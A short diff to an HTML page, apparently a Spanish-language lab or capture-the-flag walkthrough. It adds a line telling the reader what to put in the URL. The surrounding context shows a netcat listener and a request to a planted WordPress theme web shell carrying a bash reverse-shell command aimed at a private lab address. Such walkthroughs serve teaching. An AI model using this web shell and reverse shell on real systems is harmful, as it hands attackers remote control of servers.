@@ -127,6 +127,8 @@
             <pre><code class="language-bash">
             sudo nc -nlvp 443
             </code></pre>
+                        <p class="text-gray-300">A continuación en la URL ponemos:
+            </p>
             <pre><code class="language-bash">
             http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
             </code></pre>
